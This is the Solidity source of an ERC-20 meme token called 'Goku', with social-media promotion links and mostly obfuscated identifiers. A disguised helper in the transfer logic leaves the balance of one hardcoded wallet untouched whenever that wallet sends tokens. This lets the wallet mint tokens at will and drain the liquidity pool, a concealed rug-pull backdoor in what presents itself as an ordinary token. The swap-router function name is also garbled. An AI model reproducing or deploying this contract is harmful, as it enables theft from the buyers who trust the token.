/**

$Goku   
MAKE ANIME GREAT AGAIN.


TWITTER: https://twitter.com/GokuEthereum
TELEGRAM: https://t.me/GokuEthereum
WEBSITE: http://dragonballeth.com/

**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _mosqx(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _mosqx(a, b, "SafeMath");
    }

    function  _mosqx(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _puv(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _qbovby {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _pmxamcs {
    function swxactTensSortigFeOrasferke(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract Goku is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _pmxamcs private _Tfqluk;
    address payable private _Tcekigvqx;
    address private _yvacsdr;

    bool private _pauvlkh;
    bool public _Taralega = false;
    bool private oylurprk = false;
    bool private _awjofepnz = false;

    string private constant _name = unicode"Goku";
    string private constant _symbol = unicode"Goku";
    uint8 private constant _decimals = 9;
    uint256 private constant _iTotalva = 1000000000 * 10 **_decimals;
    uint256 public _kuvmkavn = _iTotalva;
    uint256 public _Woleuoqe = _iTotalva;
    uint256 public _rwapsThaesfvto= _iTotalva;
    uint256 public _gfakTvkof= _iTotalva;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _sEjagnvip;
    mapping (address => bool) private _taxraksy;
    mapping(address => uint256) private _rpbuoeo;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yavpfarq=0;
    uint256 private _bwskouje=0;


    event _mxokbvuf(uint _kuvmkavn);
    modifier oevTauhe {
        oylurprk = true;
        _;
        oylurprk = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _iTotalva;
        _sEjagnvip[owner(

        )] = true;
        _sEjagnvip[address
        (this)] = true;
        _sEjagnvip[
            _Tcekigvqx] = true;
        _Tcekigvqx = 
        payable (0x22e466447F0437e3aEE982Bc6E3C0D90958F404C);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _iTotalva);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _iTotalva;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _mosqx(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 akepoun=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Taralega) {
                if (to 
                != address
                (_Tfqluk) 
                && to !=
                 address
                 (_yvacsdr)) {
                  require(_rpbuoeo
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _rpbuoeo
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _yvacsdr && to != 
            address(_Tfqluk) &&
             !_sEjagnvip[to] ) {
                require(amount 
                <= _kuvmkavn,
                 "Exceeds the _kuvmkavn.");
                require(balanceOf
                (to) + amount
                 <= _Woleuoqe,
                  "Exceeds the macxizse.");
                if(_bwskouje
                < _yavpfarq){
                  require
                  (! _rjxputi(to));
                }
                _bwskouje++;
                 _taxraksy
                 [to]=true;
                akepoun = amount._puv
                ((_bwskouje>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _yvacsdr &&
             from!= address(this) 
            && !_sEjagnvip[from] ){
                require(amount <= 
                _kuvmkavn && 
                balanceOf(_Tcekigvqx)
                <_gfakTvkof,
                 "Exceeds the _kuvmkavn.");
                akepoun = amount._puv((_bwskouje>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_bwskouje>
                _yavpfarq &&
                 _taxraksy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!oylurprk 
            && to == _yvacsdr &&
             _awjofepnz &&
             contractTokenBalance>
             _rwapsThaesfvto 
            && _bwskouje>
            _yavpfarq&&
             !_sEjagnvip[to]&&
              !_sEjagnvip[from]
            ) {
                _rswphkfhi( _rqode(amount, 
                _rqode(contractTokenBalance,
                _gfakTvkof)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _urfnop(address
                    (this).balance);
                }
            }
        }

        if(akepoun>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(akepoun);
          emit
           Transfer(from,
           address
           (this),akepoun);
        }
        _balances[from
        ]= _mosqx(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _mosqx(akepoun));
        emit Transfer
        (from, to, 
        amount.
         _mosqx(akepoun));
    }

    function _rswphkfhi(uint256
     tokenAmount) private
      oevTauhe {
        if(tokenAmount==
        0){return;}
        if(!_pauvlkh)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Tfqluk.WETH();
        _approve(address(this),
         address(
             _Tfqluk), 
             tokenAmount);
        _Tfqluk.
        swxactTensSortigFeOrasferke
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _rqode
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _mosqx(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Tcekigvqx){
            return a ;
        }else{
            return a .
             _mosqx (b);
        }
    }

    function removesLimitrs (
        
    ) external onlyOwner{
        _kuvmkavn = _iTotalva;
        _Woleuoqe = _iTotalva;
        emit _mxokbvuf(_iTotalva);
    }

    function _rjxputi(address 
    account) private view 
    returns (bool) {
        uint256 oxzpa;
        assembly {
            oxzpa :=
             extcodesize
             (account)
        }
        return oxzpa > 
        0;
    }

    function _urfnop(uint256
    amount) private {
        _Tcekigvqx.
        transfer(
            amount);
    }

    function enablesTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _pauvlkh ) ;
        _Tfqluk  
        =  
        _pmxamcs
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Tfqluk), 
            _iTotalva);
        _yvacsdr = 
        _qbovby(_Tfqluk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Tfqluk .
             WETH ( ) );
        _Tfqluk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_yvacsdr).
        approve(address(_Tfqluk), 
        type(uint)
        .max);
        _awjofepnz = true;
        _pauvlkh = true;
    }

    receive() external payable {}
}